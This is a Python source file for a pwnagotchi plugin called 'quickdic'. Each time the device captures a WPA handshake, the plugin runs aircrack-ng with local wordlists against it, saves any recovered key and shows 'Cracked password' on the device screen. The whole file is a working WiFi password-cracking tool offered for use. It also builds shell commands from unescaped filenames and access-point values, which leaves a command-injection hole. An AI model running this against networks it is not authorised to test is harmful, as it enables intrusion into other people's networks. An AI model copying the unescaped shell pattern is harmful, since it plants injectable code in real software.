'''
Aircrack-ng needed, to install:
> apt-get install aircrack-ng
Upload wordlist files in .txt format to folder in config file (Default: /opt/wordlists/)
Cracked handshakes stored in handshake folder as [essid].pcap.cracked
'''

import os
import logging
import subprocess
from glob import glob

__author__ = 'pwnagotchi [at] rossmarks [dot] uk'
__version__ = '1.0.0'
__name__ = 'quickdic'
__license__ = 'GPL3'
__description__ = 'Run a quick dictionary scan against captured handshakes'

OPTIONS = dict()


def on_loaded():
    logging.info("Quick dictionary check plugin loaded")

def on_handshake(agent, filename, access_point, client_station):

    process = subprocess.Popen(f'/usr/bin/aircrack-ng {filename} | grep -E "[^0]\d* handshake"', shell=True, stdin=None,
                              stdout=open("/dev/null", "w"), stderr=None, executable="/bin/bash")
    process.wait()
    if process.returncode > 0:
        logging.info("[quickdic] No valid handshake ...")
        return

    logging.info("[quickdic] Valid handshake found")
    wordlists = ",".join(glob(os.path.join(OPTIONS['wordlist_folder'], "*.txt")))
    process = subprocess.Popen(f'/usr/bin/aircrack-ng -w {wordlists} -l {filename}.cracked -q -b {access_point} {filename}', shell=True, stdin=None, stdout=open("/dev/null", "w"), stderr=None, executable="/bin/bash")
    process.wait()

    if process.returncode > 0:
        logging.info("[quickdic] Key not found ...")
        return

    try:
        key = open(f"{filename}.cracked", "r").read()
    except OSError as os_err:
        logging.error(os_err)
        return

    logging.info("[quickdic] Key found (%s -> %s)", filename, key)

    ui = agent.view()
    ui.set('face', "(·ω·)")
    ui.set('status', f"Cracked password: {key}")
    ui.update(force=True)
